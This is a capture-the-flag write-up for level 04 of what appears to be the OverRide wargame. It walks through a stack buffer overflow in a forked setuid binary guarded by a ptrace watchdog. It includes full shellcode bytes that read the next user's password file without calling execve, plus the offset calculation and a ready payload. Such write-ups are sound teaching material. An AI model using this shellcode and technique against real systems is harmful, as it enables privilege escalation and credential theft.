# Level 04

## Base analysis

```
level04@OverRide:~$ id
uid=1004(level04) gid=1004(level04) groups=1004(level04),100(users)
level04@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level05 users 7563 Sep 10  2016 level04
level04@OverRide:~$ checksec --file ./level04
RELRO           STACK CANARY      NX            PIE       RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE    No RPATH   No RUNPATH   /home/users/level04/level04
```

Setuid `level05`, **no canary**, and **NX disabled** again — so we're back to shellcode injection on the stack. But this level adds a few twists that make a naive approach fail.

## Reverse engineering

The decompiled `main()` :

```c
local_14 = fork();
// ... zeroes out local_a0 (128-byte buffer) ...
if (local_14 == 0) {                       // CHILD
    prctl(1, 1);                           // PR_SET_PDEATHSIG
    ptrace(PTRACE_TRACEME, 0, 0, 0);       // child asks to be traced by parent
    puts("Give me some shellcode, k");
    gets(local_a0);                        // <-- unprotected gets(): buffer overflow
}
else {                                     // PARENT
    do {
        wait(&local_a4);
        // ... if child stopped/exited, bail out ...
        local_18 = ptrace(PTRACE_PEEKUSER, local_14, 0x2c, 0);   // read child's ORIG_EAX
    } while (local_18 != 0xb);              // 0xb == SYS_execve
    puts("no exec() for you");
    kill(local_14, 9);                     // kill child if it tried execve
}
```

Three obstacles to deal with :

1. **`fork()`** : the interesting code runs in the **child**. Under a debugger we have to follow the child, not the parent.
2. **`gets(local_a0)`** : a classic unbounded read into a 128-byte buffer → straightforward **buffer overflow**.
3. **`ptrace` watchdog** : the parent traces the child and peeks at its `ORIG_EAX` (offset `0x2c` in the user area) on every syscall. If the child ever invokes syscall `0xb` (`execve`), the parent prints "no exec() for you" and kills it. So our shellcode **must not use `execve`** — no spawning `/bin/sh`. We instead read the password file directly with `open` / `read` / `write`.

## Finding the offset

Because of the `fork()`, we tell gdb to follow the child :

```bash
gdb level04
(gdb) set follow-fork-mode child
(gdb) r
[New process XXXX]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5...Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process XXXX]
0x41326641 in ?? ()
```

The faulting EIP is `0x41326641`. In memory (little-endian) those bytes are `41 66 32 41` = `Af2A`. Looking that sequence up in the pattern gives :

```
offset: 156
```

So : 156 bytes of padding, then 4 bytes overwriting the saved EIP.

(For tracing with `ltrace`, the `-f` flag is needed to follow the forked child as well.)

## The exec-less shellcode

Since `execve` is forbidden by the ptrace watchdog, we use a shellcode that `open()`s the next password file, `read()`s it, and `write()`s it to stdout. The target path is appended at the end of the shellcode :

```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

The syscalls used (`al=5` open, `al=3` read, `al=4` write, `al=1` exit) confirm there's no `execve` (`al=0xb`), so the watchdog never fires.

Storing the shellcode in an **environment variable** is convenient : it keeps the payload out of the overflow buffer entirely, and the variable lives at a high, fairly stable address on the stack that we can jump to.

## Locating the shellcode address

We find the address of the `SHELLCODE` env var with a tiny helper :

```c
// getenv.c
#include <stdio.h>
#include <stdlib.h>
int main(void) { printf("%p\n", getenv("SHELLCODE")); }
```

```bash
gcc -m32 getenv.c -o getenv
./getenv
0xffffd8XX
```

> **Important caveat.** The address printed by `getenv` is only valid for the `getenv` process. Environment variables sit near the top of the stack, *after* `argv[0]` (the program path). Because `./getenv` and `./level04` have different path lengths, the env var lands at a slightly different address in each. To get a reliable address, either pad the helper's name to the same length as `/home/users/level04/level04`, or compute the offset and adjust. A common trick is to run the helper as a path the exact same length as the target binary's path so the stack layout matches.

## Exploitation

With the corrected shellcode address, we build the payload : 156 bytes of padding followed by that address (little-endian), and pipe it into the child :

```bash
python -c "print 156 * 'a' + '\xff\xff\xd8\x7a'[::-1]" | ./level04
Give me some shellcode, k
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

When `gets` returns, the overwritten saved EIP redirects execution into our env-var shellcode, which opens `/home/users/level05/.pass`, reads it, and writes the contents out — all without ever calling `execve`, so the ptrace watchdog stays quiet. Since the binary is setuid `level05`, the `open` succeeds and we get the next level's password.

Level 04, clear... Progress to next level ? (Y/n) : ___
